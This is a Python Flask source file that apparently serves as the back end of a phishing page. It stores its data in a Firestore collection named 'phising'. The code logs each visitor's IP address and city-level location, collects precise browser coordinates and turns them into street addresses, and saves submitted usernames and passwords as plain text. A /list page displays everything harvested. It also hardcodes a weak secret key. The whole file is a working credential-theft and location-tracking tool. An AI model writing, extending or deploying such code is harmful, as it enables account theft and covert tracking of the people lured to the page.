from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
import uuid
import json
from datetime import datetime
import os
import firebase_admin
from firebase_admin import credentials, firestore, initialize_app
import requests
from geopy.geocoders import Nominatim
from google.cloud.firestore import SERVER_TIMESTAMP


cred = credentials.Certificate("cred.json")
default_app = initialize_app(cred)
db = firestore.client()
ref = db.collection('phising')

app = Flask(__name__)
app.secret_key = 'hihi123'

def reverse_geocode(lat, lon):
    geolocator = Nominatim(user_agent="geoapi")
    location = geolocator.reverse((lat, lon), language='en')
    return location.address if location else "Location not found"

def get_ip_location(ip):
    url = f"https://ipinfo.io/{ip}/json"
    try:
        response = requests.get(url)
        data = response.json()
        return {
            "IP": data.get("ip"),
            "City": data.get("city"),
            "Region": data.get("region"),
            "Country": data.get("country"),
            "Location": data.get("loc"),
            "ISP": data.get("org")
        }
    except Exception as e:
        return {"error": str(e)}

@app.route("/")
def home():
    ref.add({'log':'IP location', 'information':f'IP: {request.remote_addr}, Location: {json.dumps(get_ip_location(request.remote_addr))}', "timestamp": SERVER_TIMESTAMP})
    return render_template("index.html")

@app.route("/script", methods=['POST'])
def script():
    data = request.data.decode()
    lat = json.loads(data)['latitude']
    lon = json.loads(data)['longitude']
    
    ref.add({'log':'Real location', 'information':f'Latitude, Longitude: {data}, Location: {reverse_geocode(lat, lon)}', "timestamp": SERVER_TIMESTAMP})
    return render_template("index.html")

@app.route("/script2", methods=['POST'])
def script2():
    data = request.data.decode()
    
    ref.add({'log':'Login', 'information':f'Username, password: {data}', "timestamp": SERVER_TIMESTAMP})
    return render_template("index.html")

@app.route("/list", methods=['GET','POST'])
def list_documents():
    try:
        docs = ref.order_by('timestamp').stream()

        data = []
        for doc in docs:
            data.append({
                'id': doc.id,
                **doc.to_dict()
            })

        return render_template("list.html", data=data)

    except Exception as e:
        return jsonify({"error": str(e)}), 500